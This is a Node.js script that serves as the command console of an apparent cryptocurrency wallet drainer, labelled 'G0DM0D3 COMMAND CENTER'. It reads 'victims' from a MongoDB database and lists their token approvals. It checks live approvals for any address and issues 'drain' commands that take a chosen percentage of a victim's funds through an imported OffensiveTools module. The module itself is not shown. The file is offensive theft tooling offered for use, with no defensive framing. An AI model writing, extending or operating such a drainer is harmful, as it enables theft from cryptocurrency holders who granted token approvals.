const { ethers } = require('ethers');
const mongoose = require('mongoose');
require('dotenv').config();
const Victim = require('./src/models/Victim');
const Contract = require('./src/models/Contract');
const OffensiveTools = require('./src/services/OffensiveTools');

const offensiveTools = new OffensiveTools();

async function run() {
    const action = process.argv[2];
    const param = process.argv[3];
    const percentage = process.argv[4] || 100;

    try {
        await mongoose.connect(process.env.MONGODB_URI, {
            useNewUrlParser: true,
            useUnifiedTopology: true,
            dbName: 'godmod-dcrypt'
        });

        switch (action) {
            case 'list':
                const victims = await Victim.find({}).sort({ lastSeen: -1 });
                console.log('\n--- TARGET LIST ---');
                victims.forEach((v, i) => {
                    console.log(`[${i}] ${v.address} (${v.network}) - Status: ${v.status}`);
                    if (v.approvedTokens.length > 0) {
                        console.log(`    Approvals: ${JSON.stringify(v.approvedTokens)}`);
                    }
                });
                break;

            case 'drain':
                if (!param) {
                    console.log('Usage: node command-center.js drain <victim_address> <percentage>');
                    break;
                }
                const victim = await Victim.findOne({ address: param.toLowerCase() });
                if (!victim) {
                    console.log('Victim not found in database.');
                    break;
                }
                console.log(`Initiating ${percentage}% drain on ${victim.address}...`);
                const result = await offensiveTools.drainVictim(victim, percentage);
                console.log('Result:', result);
                break;

            case 'check':
                if (!param) {
                    console.log('Usage: node command-center.js check <address> <network>');
                    break;
                }
                const network = process.argv[4] || 'bsc';
                console.log(`Checking live blockchain approvals for ${param} on ${network}...`);
                const approvals = await offensiveTools.checkApprovals(param, network);
                console.log('Live Approvals:', approvals);
                break;

            default:
                console.log('\n--- G0DM0D3 COMMAND CENTER ---');
                console.log('Available Commands:');
                console.log('  list                       - List all victims in database');
                console.log('  drain <address> <percent>  - Trigger manual drain');
                console.log('  check <address> <network>  - Check live approvals for any address');
        }

    } catch (error) {
        console.error('Error:', error.message);
    } finally {
        await mongoose.connection.close();
        process.exit(0);
    }
}

run();
